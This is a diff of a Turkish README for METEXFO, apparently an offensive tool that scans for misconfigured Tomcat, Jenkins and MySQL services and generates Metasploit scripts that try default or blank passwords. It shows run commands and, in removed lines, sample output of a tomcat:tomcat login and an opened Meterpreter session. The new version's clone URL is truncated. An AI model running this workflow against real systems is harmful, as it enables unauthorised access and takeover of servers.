@@ -1,137 +1,132 @@
-# 💀 METEXFO v5.0 | Modern Logic & Misconfig Agent
-
 <p align="center">
-<img src="https://shields.io">
-<img src="https://img.shields.io/badge/LANGUAGE-PYTHON3-blue?style=for-the-badge&logo=python">
-<img src="https://img.shields.io/badge/PLATFORM-KALI_LINUX-green?style=for-the-badge&logo=linux">
-<img src="https://img.shields.io/badge/LICENSE-MIT-yellow?style=for-the-badge">
+  <img src="https://demolab.com" alt="Metexfo Typing SVG" />
 </p>
 
 <p align="center">
-  <img src="https://i.hizliresim.com/gu9vdo8.gif" width="600" alt="METEXFO Banner">
+  <a href="https://github.com">
+    <img src="https://shields.io">
+    <img src="https://shields.io">
+    <img src="https://shields.io">
+    <img src="https://shields.io">
+  </a>
 </p>
 
 <p align="center">
-<i>VERSION 5.0 METEXFO - MODERN TEMPLATE-BASED RECON & EXPLOIT ORCHESTRATOR</i>
+  <img src="https://hizliresim.com" width="650" alt="METEXFO Cyberpunk Banner" style="border-radius: 10px; border: 2px solid #ff0033;">
+</p>
+
+<p align="center">
+  <img src="https://shields.io" alt="Stars">
+  <img src="https://shields.io" alt="Forks">
 </p>
 
 ---
 
-## 🌌 Genel Bakış
-**METEXFO v5.0**, klasik versiyon tarama araçlarının ötesine geçerek hedef ağlardaki **kritik yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** avlayan modern bir siber güvenlik otomasyon ajanıdır. 
+## 🌌 GENEL BAKIŞ
+**METEXFO v5.0 (Vivid Edition)**, klasik sızma testi araçlarının hantallığını yıkan, yapay zekavari bir mantıkla çalışan **Otomatik Yapılandırma Hatası & Panel Avcısıdır**. 
 
-Birden fazla hedefi eşzamanlı (Multi-threading) olarak tarar, akıllı şablon veritabanı ile eşleştirir ve **Metasploit Framework** için tam otomatik bir saldırı planı (`.rc`) üretir. İşlem bittiğinde, derinlemesine log analizi yaparak sızma başarı durumunu önünüze serer.
-
-### 🛡️ Neden METEXFO v5.0?
-
-| Özellik | Açıklama |
-| :--- | :--- |
-| **Multi-Threading** | Eşzamanlı iş parçacığı (Thread-safe Kuyruk) mimarisiyle ultra hızlı çoklu hedef taraması. |
-| **Misconfig Focus** | Yazılım açıklarından ziyade Apache Tomcat, Jenkins, MySQL gibi servislerdeki zayıf/boş şifre yapılandırmalarını hedefler. |
-| **Dinamik RC Üretimi** | SSL/TLS durumları dahil olmak üzere hedefe özel Metasploit kaynak kodlarını otomatik yazar. |
-| **Derin Log Analizi** | `--analyze` motoru sayesinde Metasploit loglarını tarayarak kritik sızma başarılarını raporlar. |
+Hedef ağları siber güvenlik ajanı hassasiyetiyle tarar, açık yönetim panellerini (Tomcat, Jenkins, MySQL) enseleyip **Metasploit Framework** için tetiğe basılmaya hazır, ölümcül bir saldırı senaryosu (`.rc`) inşa eder.
 
 ---
 
-## 🛠️ Kurulum & Gereksinimler
+## ⚡ ÖNE ÇIKAN SİBER YETENEKLER
 
-Sisteminizde `Nmap` ve `python-nmap`, `colorama` kütüphanelerinin kurulu olduğundan emin olun:
+```diff
++ [🚀] MULTI-THREADING LOGIC : Aynı anda 5 farklı hedefi çökertme potansiyeli
++ [🎯] MISCONFIG TARGETING   : Karmaşık exploitler yerine en zayıf halkaya (boş/varsayılan şifreler) odaklanma
++ [🛠️] DYNAMIC RC ENGINE     : Portun SSL/TLS durumuna göre anlık modül konfigürasyonu
++ [🔍] DEEP LOG PARSER       : msfconsole bittikten sonra logları tarayıp kritik başarıları ayıklayan analiz motoru
+```
+
+---
+
+## 🎨 GÖRSEL OPERASYON PANELİ (DOKÜMANTASYON)
+
+### 📊 Sistem Mimarisi ve Karşılaştırma
+
+| Yetenek | Klasik Tarayıcılar | METEXFO v5.0 Vivid | Status |
+| :--- | :---: | :---: | :---: |
+| **Hız Protokolü** | 🐢 Tekli İşlem | ⚡ Multi-Thread (Kuyruk Safe) | `SUCCESS` |
+| **Zafiyet Analizi** | 📋 Sadece Listeler | 🧠 Akıllı Şablon Eşleştirme | `ELITE` |
+| **Saldırı Hazırlığı** | ❌ Manuel Yazım | 🤖 Otomatik `.rc` Skript Derleme | `AUTOMATED` |
+| **Log Analiz Motoru** | 👁️ Manuel Okuma | 🔬 Regex Destekli Raporlama | `CRITICAL` |
+
+---
+
+## 🛠️ KURULUM VE SİBER KURULUM
+
+Ekranınızda yeşil ve neon renklerin akması için terminale şu komutları sırayla girin:
 
 ```bash
-# Sistem paketlerini güncelleyin ve Nmap kurun
+# Sistem altyapısını güçlendirin
 sudo apt update && sudo apt install nmap -y
 
-# Depoyu klonlayın ve dizine geçin
-git clone https://github.com/ghost0x02/metexfo
+# Cyber Projeyi siber dizine klonlayın
+git clone https://github.com
 cd METEXFO
 
-# Gerekli Python kütüphanelerini yükleyin
+# Görsel kütüphaneleri ayağa kaldırın
 pip3 install python-nmap colorama
 ```
 
 ---
 
-## 🚀 Kullanım Kılavuzu
+## 🚀 KULLANIM SENARYOLARI (CANLI KOMUTLAR)
 
-METEXFO v5.0 iki temel modda çalışır: **Operasyon Planı Hazırlama** ve **Post-Saldırı Log Analizi**.
-
-### 1. Keşif ve Otomatik Operasyon Planı Üretimi
-Tek veya virgülle ayrılmış çoklu hedefleri taramak ve Metasploit reçetesi oluşturmak için:
+### 🛡️ Mod 1: Keşif ve Reçete Üretimi (Çoklu Hedef)
 ```bash
-python3 mme5.py -t <HEDEF_IP_VEYA_LISTESI> -l <KENDİ_LHOST_IP_ADRESİNİZ>
-
-# Örnek (Çoklu Hedef Taraması):
 python3 mme5.py -t 192.168.1.50,192.168.1.60 -l 192.168.1.10
 ```
 
-### 2. Metasploit Üzerinde Otomatik Saldırıyı Tetikleme
-Üretilen modern operasyon planını çalıştırmak için terminalde şu komutu girmeniz yeterlidir:
+### 💀 Mod 2: Metasploit Üzerinden Cehennemi Tetikleme
 ```bash
 msfconsole -q -r metexfo_final_agent.rc
 ```
 
-### 3. Derin Log Analiz Motorunu Çalıştırma
-Saldırı oturumu kapandıktan sonra, elde edilen başarıları ve sızılan panelleri raporlamak için:
+### 🔬 Mod 3: Derin Görev Sonu Analiz Motoru
 ```bash
 python3 mme5.py -t 192.168.1.50 -l 192.168.1.10 --analyze
 ```
 
 ---
 
-## 🔰 Örnek İşlem Çıktıları
+## 🔮 VIVID TERMINAL EKRAN ALINTILARI
 
-### A. Tarama ve Hazırlık Aşaması:
-```text
-    METEXFO
+### 📡 Tarama Başladığında Alınan Neon Çıktı:
+```🔥
+    ██████╗  ██████╗ ███╗   ██╗██╗  ██╗██████╗ 
+    ██╔══██╗██╔═══██╗████╗  ██║██║  ██║██╔══██╗
+    ██████╔╝██║   ██║██╔██╗ ██║███████║██████╔╝
+    ██╔═══╝ ██║   ██║██║╚██╗██║██╔══██║██╔═══╝ 
+    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     
+ ───────────────────────────────────────────────────────────────
+ ⚡ AGENT STATUS : MODERN LOGIC AGENT  ⚡ VERSION : 5.0-VIVID
+ 🎯 TOTAL TARGETS: 2               🎯 MY LHOST: 192.168.1.10
+ 🛡️ ENGINE MODE  : [ MODERN-MISCONFIG-SCAN ]
+ ───────────────────────────────────────────────────────────────
 
- >> STATUS: MODERN LOGIC AGENT | VERSION : 5.0 | TEMPLATE-BASED RECON
- >> TARGETS: 2 | LHOST: 192.168.1.10 | MODE: MODERN-MISCONFIG-SCAN
-
-[*] Modern İstek Taraması Başladı: 192.168.1.50
-[FOUND] 192.168.1.50 -> Port 8080 (http Apache Tomcat/9.0)
-[+] ANALİZ: 192.168.1.50 | PORT: 8080 --> http apache tomcat/9.0
-[MODERN-TEMPLATE] Apache Tomcat Yönetim Paneli Tespiti modülü hazırlanıyor...
-
-[+] MODERN OPERASYON PLANI HAZIR: metexfo_final_agent.rc
-[*] Metasploit ile çalıştırmak için:
-msfconsole -q -r metexfo_final_agent.rc
+[📡 TARAMA BAŞLADI] ➔  192.168.1.50 
+    ├─ [PORT BULUNDU] 192.168.1.50:8080 (http Apache Tomcat/9.0)
+    ├─ [ANALİZ] 192.168.1.50 ➔ PORT: 8080 [http apache tomcat/9.0]
+    │  ├─ ➔ [ŞABLON EŞLEŞTİ] Apache Tomcat Yönetim Paneli Tespiti
 ```
 
-### B. Hack İşlemi Başarılı Olduğunda Alınan Canlı Sızma Çıktısı:
-Metasploit planı tetiklediğinde ve hedef panel zayıf şifrelerle kırıldığında elde edilen **Meterpreter komut satırı** bağlantısı:
-```text
-[+] 192.168.1.50:8080 - Tomcat Manager / manager/html LOGIN SUCCESSFUL: tomcat:tomcat
-[*] Uploading payload...
-[*] Executing payload...
-[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49231)
-
-meterpreter > sysinfo
-Computer        : METEXFO-VICTIM-SVR
-OS              : Ubuntu 22.04.3 LTS (Linux 5.15.0)
-Architecture    : x64
-meterpreter > _
-```
-
-### C. Modern Analiz Motoru Raporu (`--analyze`):
-```text
-[*] Modern Log Analiz Motoru Çalıştırılıyor...
-
---- MODERN ANALİZ RAPORU ---
-[CRITICAL] BAŞARI: Apache Tomcat yönetim paneli zayıf kimlik bilgisiyle ele geçirildi!
-[CRITICAL] BAŞARI: MySQL veritabanına şifresiz/boş parolarla erişim sağlandı!
-----------------------------
+### 🏆 Başarı Raporu Ekranı:
+```ascii
+╔═════════════════════════════════════════════════════════════════╗
+║                 URGENT CRITICAL ANALYSIS REPORT                 ║
+╠═════════════════════════════════════════════════════════════════╣
+║ 💀 [CRITICAL] BAŞARI: Tomcat Paneli Zayıf Kimlik Bilgisiyle Düştü! 
+║ 💀 [CRITICAL] BAŞARI: MySQL root Yetkisi Şifresiz Ele Geçirildi!  
+╚═════════════════════════════════════════════════════════════════╝
 ```
 
 ---
 
-## 📊 Modern Zafiyet Şablonları Veritabanı (v5.0)
-Şu anki güncel şablon mimarisi aşağıdaki kritik servislere doğrudan odaklanmaktadır:
-* **HTTP / HTTPS (80, 443, 8080):** Apache Tomcat Manager Login (Brute-Force), Jenkins Automation Enumeration, Web Directory Scanner.
-* **MySQL (3306):** Root Blank Password Check & Takeover modülü.
+## ⚖️ YASAL UYARI
+Bu yazılım tamamen **White-Hat (Beyaz Şapkalı)** güvenlik araştırmacıları, siber defans ekipleri ve eğitim faaliyetleri için dizayn edilmiştir. Yetkisiz ağlarda kullanılması kesinlikle yasaktır ve yasal sorumluluk tamamen kullanıcıya aittir. 
 
----
-
-## ⚖️ Yasal Uyarı
-Bu araç yalnızca yasal sızma testleri, güvenlik araştırmaları ve eğitim amaçlı geliştirilmiştir. İzin alınmamış sistemler üzerinde kullanılması yasal sorumluluk doğurabilir. Kullanıcı, doğabilecek tüm hukuki sonuçlardan kendisi sorumludur.
-
-**Developer:** `GHOST0X02` | **Version:** `5.0-Elite`
+<p align="center">
+  <b>Developed with ❤️ by GHOST0X02</b> <br>
+  <i>"Hack the planet, but legally."</i>
+</p>
